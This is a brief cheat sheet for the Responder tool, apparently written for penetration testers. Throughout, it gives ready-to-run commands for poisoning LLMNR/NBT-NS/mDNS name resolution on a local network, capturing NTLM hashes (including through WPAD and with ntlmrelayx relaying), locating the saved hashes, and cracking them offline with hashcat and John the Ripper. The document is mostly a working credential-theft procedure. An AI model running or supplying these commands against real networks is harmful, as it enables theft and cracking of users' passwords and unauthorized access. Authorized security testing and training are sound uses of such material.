# Responder - Cheat Sheet

## Basic Usage
- **Start Responder on a specific interface:**
  ```bash
  sudo responder -I eth0
  ```
  *(Captures hashes, poisons LLMNR/NBT-NS/mDNS. This is the standard operational mode).*

- **Analyze network without poisoning (Analyze Mode):**
  ```bash
  sudo responder -I eth0 -A
  ```
  *(Passively listens to see if the network is vulnerable without actively intercepting).*

## Configuration Options (`Responder.conf`)
Located usually at `/etc/responder/Responder.conf` or `/usr/share/responder/Responder.conf`.
- **Disable specific servers:** Set `HTTP = Off`, `SMB = Off`, etc., if you are combining Responder with a relay tool (like `ntlmrelayx`), which needs those ports open.
- **WPAD setup:** Enable WPAD proxy server to capture hashes via web traffic.

## Log and Hash Retrieval
- Hashes are printed to the console in real-time.
- **Saved hashes location:** `/usr/share/responder/logs/` (or similar depending on installation).
- **Format:** Formatted nicely for Hashcat/John the Ripper.

## Cracking Captured Hashes (NTLMv2)
- **Using Hashcat:**
  ```bash
  hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
  ```
- **Using John the Ripper:**
  ```bash
  john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
  ```
